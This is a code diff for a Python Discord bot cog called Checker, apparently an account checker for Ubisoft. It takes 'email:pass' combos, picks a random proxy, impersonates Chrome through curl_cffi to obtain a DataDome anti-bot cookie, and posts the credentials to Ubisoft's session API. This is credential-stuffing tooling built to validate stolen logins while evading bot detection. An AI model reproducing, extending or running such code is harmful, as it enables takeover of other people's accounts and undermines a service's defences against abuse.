@@ -11,7 +11,6 @@ import os
 import json
 from curl_cffi import requests
 
-# Original Ubisoft App ID
 UBI_APP_ID = "314d4fef-e568-454a-ae06-43e3bece12a6"
 
 class Checker(commands.Cog):
@@ -56,29 +55,33 @@ class Checker(commands.Cog):
         
         await asyncio.sleep(random.uniform(1.0, 2.0))
 
-        embed = discord.Embed(color=0x5865F2, title="🔍 Account Check", description=f"**User:** {interaction.user.mention}\n**Type:** Ubisoft Email:Pass\n**Input:** `{account}`")
+        headers = {
+            "Content-Type": "application/json",
+            "Ubi-AppId": UBI_APP_ID,
+            "Authorization": f"Basic {b64_auth}",
+            "Accept": "application/json",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Origin": "https://account.ubisoft.com",
+            "Referer": "https://account.ubisoft.com/",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+        }
+
+        embed = discord.Embed(color=0x5865F2, title="🔍 Account Check", description=f"**User:** {interaction.user.mention}\n**Input:** `{account}`")
         
         proxy = random.choice(self.proxies) if self.proxies else None
 
         try:
             def do_request():
                 session = requests.Session(impersonate="chrome124")
+                
                 if proxy:
+                    # If proxy is a string, convert to dict for requests
                     session.proxies = {"http": proxy, "https": proxy}
-
+                    
                 # Step 1: Get DataDome cookie
                 session.get("https://account.ubisoft.com/en-US/login", timeout=10)
 
-                # Step 2: Hit the API with the cookie
-                headers = {
-                    "Content-Type": "application/json",
-                    "Ubi-AppId": UBI_APP_ID,
-                    "Authorization": f"Basic {b64_auth}",
-                    "Origin": "https://account.ubisoft.com",
-                    "Referer": "https://account.ubisoft.com/en-US/login",
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
-                }
-                
+                # Step 2: Login
                 return session.post(
                     "https://public-ubiservices.ubi.com/v3/profiles/sessions",
                     headers=headers,
@@ -206,7 +209,7 @@ class Checker(commands.Cog):
                     session = requests.Session(impersonate="chrome124")
                     if proxy:
                         session.proxies = {"http": proxy, "https": proxy}
-
+                        
                     session.get("https://account.ubisoft.com/en-US/login", timeout=10)
 
                     headers = {
